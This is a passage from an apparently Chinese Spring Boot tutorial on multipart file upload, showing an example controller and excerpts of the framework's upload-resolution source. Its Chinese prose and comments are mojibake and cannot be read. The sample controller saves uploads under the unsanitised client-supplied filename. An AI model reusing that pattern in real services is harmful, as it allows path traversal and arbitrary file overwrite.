class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormTestController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/form_layouts&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">form_layouts</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;form/form_layouts&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;email&quot;)</span> String email,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestPart(&quot;headerImg&quot;)</span> MultipartFile headerImg,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestPart(&quot;photos&quot;)</span> MultipartFile[] photos)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        log.info(<span class="hljs-string">&quot;ä¸Šä¼ çš„ä¿¡æ¯ï¼šemail=&#123;&#125;ï¼Œusername=&#123;&#125;ï¼ŒheaderImg=&#123;&#125;ï¼Œphotos=&#123;&#125;&quot;</span>,<br>                 email,username,headerImg.getSize(),photos.length);<br><br>        <span class="hljs-keyword">if</span>(!headerImg.isEmpty())&#123;<br>            <span class="hljs-comment">//ä¿å­˜åˆ°æ–‡ä»¶æœåŠ¡å™¨ï¼ŒOSSæœåŠ¡å™¨</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> headerImg.getOriginalFilename();<br>            headerImg.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;H:\\cache\\&quot;</span>+originalFilename));<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(photos.length &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">for</span> (MultipartFile photo : photos) &#123;<br>                <span class="hljs-keyword">if</span>(!photo.isEmpty())&#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> photo.getOriginalFilename();<br>                    photo.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;H:\\cache\\&quot;</span>+originalFilename));<br>                &#125;<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;main&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é…ç½®ç±»ï¼š</p><ul><li><code>org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration</code></li><li><code>org.springframework.boot.autoconfigure.web.servlet.MultipartProperties</code></li></ul><p>æ–‡ä»¶å¤§å°ç›¸å…³é…ç½®é¡¹ï¼š</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.servlet.multipart.max-file-size</span>=<span class="hljs-string">10MB</span><br><span class="hljs-attr">spring.servlet.multipart.max-request-size</span>=<span class="hljs-string">100MB</span><br></code></pre></td></tr></table></figure><h2 id="51ã€æ–‡ä»¶ä¸Šä¼ -ã€æºç æµç¨‹ã€‘æ–‡ä»¶ä¸Šä¼ å‚æ•°è§£æå™¨"><a href="#51ã€æ–‡ä»¶ä¸Šä¼ -ã€æºç æµç¨‹ã€‘æ–‡ä»¶ä¸Šä¼ å‚æ•°è§£æå™¨" class="headerlink" title="51ã€æ–‡ä»¶ä¸Šä¼ -ã€æºç æµç¨‹ã€‘æ–‡ä»¶ä¸Šä¼ å‚æ•°è§£æå™¨"></a>51ã€æ–‡ä»¶ä¸Šä¼ -ã€æºç æµç¨‹ã€‘æ–‡ä»¶ä¸Šä¼ å‚æ•°è§£æå™¨</h2><p>æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„è‡ªåŠ¨é…ç½®ç±»<code>MultipartAutoConfiguration</code>æœ‰åˆ›å»ºæ–‡ä»¶ä¸Šä¼ å‚æ•°è§£æå™¨<code>StandardServletMultipartResolver</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, StandardServletMultipartResolver.class, MultipartConfigElement.class &#125;)</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;spring.servlet.multipart&quot;, name = &quot;enabled&quot;, matchIfMissing = true)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@EnableConfigurationProperties(MultipartProperties.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultipartAutoConfiguration</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MultipartProperties multipartProperties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">MultipartAutoConfiguration</span><span class="hljs-params">(MultipartProperties multipartProperties)</span> &#123;<br><span class="hljs-built_in">this</span>.multipartProperties = multipartProperties;<br>&#125;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnMissingBean(&#123; MultipartConfigElement.class, CommonsMultipartResolver.class &#125;)</span><br><span class="hljs-keyword">public</span> MultipartConfigElement <span class="hljs-title function_">multipartConfigElement</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.multipartProperties.createMultipartConfig();<br>&#125;<br><br><span class="hljs-meta">@Bean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(MultipartResolver.class)</span><br><span class="hljs-keyword">public</span> StandardServletMultipartResolver <span class="hljs-title function_">multipartResolver</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//é…ç½®å¥½æ–‡ä»¶ä¸Šä¼ è§£æå™¨</span><br><span class="hljs-type">StandardServletMultipartResolver</span> <span class="hljs-variable">multipartResolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardServletMultipartResolver</span>();<br>multipartResolver.setResolveLazily(<span class="hljs-built_in">this</span>.multipartProperties.isResolveLazily());<br><span class="hljs-keyword">return</span> multipartResolver;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ–‡ä»¶ä¸Šä¼ è§£æå™¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StandardServletMultipartResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultipartResolver</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">resolveLazily</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setResolveLazily</span><span class="hljs-params">(<span class="hljs-type">boolean</span> resolveLazily)</span> &#123;<br><span class="hljs-built_in">this</span>.resolveLazily = resolveLazily;<br>&#125;<br><br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><span class="hljs-keyword">return</span> StringUtils.startsWithIgnoreCase(request.getContentType(), <span class="hljs-string">&quot;multipart/&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> MultipartHttpServletRequest <span class="hljs-title function_">resolveMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> MultipartException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request, <span class="hljs-built_in">this</span>.resolveLazily);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanupMultipart</span><span class="hljs-params">(MultipartHttpServletRequest request)</span> &#123;<br><span class="hljs-keyword">if</span> (!(request <span class="hljs-keyword">instanceof</span> AbstractMultipartHttpServletRequest) ||<br>((AbstractMultipartHttpServletRequest) request).isResolved()) &#123;<br><span class="hljs-comment">// To be on the safe side: explicitly delete the parts,</span><br><span class="hljs-comment">// but only actual file parts (for Resin compatibility)</span><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">for</span> (Part part : request.getParts()) &#123;<br><span class="hljs-keyword">if</span> (request.getFile(part.getName()) != <span class="hljs-literal">null</span>) &#123;<br>part.delete();<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>LogFactory.getLog(getClass()).warn(<span class="hljs-string">&quot;Failed to perform cleanup of multipart items&quot;</span>, ex);<br>&#125;<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> MultipartResolver multipartResolver;<br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initMultipartResolver</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>...<br>        <br>        <span class="hljs-comment">//è¿™ä¸ªå°±æ˜¯é…ç½®ç±»é…ç½®çš„StandardServletMultipartResolveræ–‡ä»¶ä¸Šä¼ è§£æå™¨</span><br><span class="hljs-built_in">this</span>.multipartResolver = context.getBean(MULTIPART_RESOLVER_BEAN_NAME, MultipartResolver.class);<br>...<br>&#125;<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//æœ€åfinallyçš„å›æ”¶flag</span><br>...<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//åšé¢„å¤„ç†,å¦‚æœæœ‰ä¸Šä¼ æ–‡ä»¶ å°±new StandardMultipartHttpServletRequeståŒ…è£…ç±»</span><br>processedRequest = checkMultipart(request);<br>multipartRequestParsed = (processedRequest != request);<br><span class="hljs-comment">// Determine handler for the current request.</span><br>mappedHandler = getHandler(processedRequest);<br><br>                ...<br><br><span class="hljs-comment">// Determine handler adapter for the current request.</span><br><span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>...<br><br><span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>                <br>            &#125;<br>            ....<br>            <br><span class="hljs-keyword">finally</span> &#123;<br><br>            ...<br>            <br>            <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>                cleanupMultipart(processedRequest);<br>            &#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> HttpServletRequest <span class="hljs-title function_">checkMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> MultipartException &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.multipartResolver != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.multipartResolver.isMultipart(request)) &#123;<br>            ...<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.multipartResolver.resolveMultipart(request);<br>            ...<br>&#125;<br>    &#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanupMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.multipartResolver != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-type">MultipartHttpServletRequest</span> <span class="hljs-variable">multipartRequest</span> <span class="hljs-operator">=</span><br>WebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);<br><span class="hljs-keyword">if</span> (multipartRequest != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.multipartResolver.cleanupMultipart(multipartRequest);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</code>è·³åˆ°ä»¥ä¸‹çš„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>ModelAndView mav;<br>...<br>mav = invokeHandlerMethod(request, response, handlerMethod);<br>        ...<br><span class="hljs-keyword">return</span> mav;<br>&#125;<br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br><span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br><span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//å…³æ³¨ç‚¹</span><br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br>...<br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<br>...<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>this.argumentResolvers</code>å…¶ä¸­ä¸»è§’ç±»<code>RequestPartMethodArgumentResolver</code>ç”¨æ¥ç”Ÿæˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br>    <br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>...<br>&#125;<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeForRequest</span><span class="hljs-params">(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);<br>...<br><span class="hljs-keyword">return</span> doInvoke(args);<span class="hljs-comment">//åå°„è°ƒç”¨</span><br>&#125;<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">doInvoke</span><span class="hljs-params">(Object... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> getBridgedMethod();<br>ReflectionUtils.makeAccessible(method);<br><span class="hljs-keyword">return</span> method.invoke(getBean(), args);<br>...<br>&#125;<br>    <br>    <span class="hljs-comment">//å¤„ç†å¾—å‡ºmultipartå‚æ•°ï¼Œå‡†å¤‡ç¨åçš„åå°„è°ƒç”¨ï¼ˆ@PostMappingæ ‡è®°çš„ä¸Šä¼ æ–¹æ³•ï¼‰</span><br>    <span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,<br>Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br><br>MethodParameter[] parameters = getMethodParameters();<br>...<br>Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[parameters.length];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; parameters.length; i++) &#123;<br><span class="hljs-type">MethodParameter</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> parameters[i];<br>parameter.initParameterNameDiscovery(<span class="hljs-built_in">this</span>.parameterNameDiscoverer);<br>args[i] = findProvidedArgument(parameter, providedArgs);<br><span class="hljs-keyword">if</span> (args[i] != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>            <span class="hljs-comment">//å…³æ³¨ç‚¹1</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resolvers.supportsParameter(parameter)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//å…³æ³¨ç‚¹2</span><br>args[i] = <span class="hljs-built_in">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-built_in">this</span>.dataBinderFactory);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> args;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPartMethodArgumentResolver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span> &#123;<br><br>    <span class="hljs-comment">//å¯¹åº”ä¸Šé¢ä»£ç å…³æ³¨ç‚¹1</span><br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br>        <span class="hljs-comment">//æ ‡æ³¨@RequestPartçš„å‚æ•°</span><br><span class="hljs-keyword">if</span> (parameter.hasParameterAnnotation(RequestPart.class)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (parameter.hasParameterAnnotation(RequestParam.class)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> MultipartResolutionDelegate.isMultipartArgument(parameter.nestedIfOptional());<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">//å¯¹åº”ä¸Šé¢ä»£ç å…³æ³¨ç‚¹2</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest request, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> request.getNativeRequest(HttpServletRequest.class);<br>Assert.state(servletRequest != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No HttpServletRequest&quot;</span>);<br><br><span class="hljs-type">RequestPart</span> <span class="hljs-variable">requestPart</span> <span class="hljs-operator">=</span> parameter.getParameterAnnotation(RequestPart.class);<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isRequired</span> <span class="hljs-operator">=</span> ((requestPart == <span class="hljs-literal">null</span> || requestPart.required()) &amp;&amp; !parameter.isOptional());<br><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> getPartName(parameter, requestPart);<br>parameter = parameter.nestedIfOptional();<br><span class="hljs-type">Object</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-comment">//å°è£…æˆMultipartFileç±»å‹çš„å¯¹è±¡ä½œå‚æ•°</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">mpArg</span> <span class="hljs-operator">=</span> MultipartResolutionDelegate.resolveMultipartArgument(name, parameter, servletRequest);<br><span class="hljs-keyword">if</span> (mpArg != MultipartResolutionDelegate.UNRESOLVABLE) &#123;<br>arg = 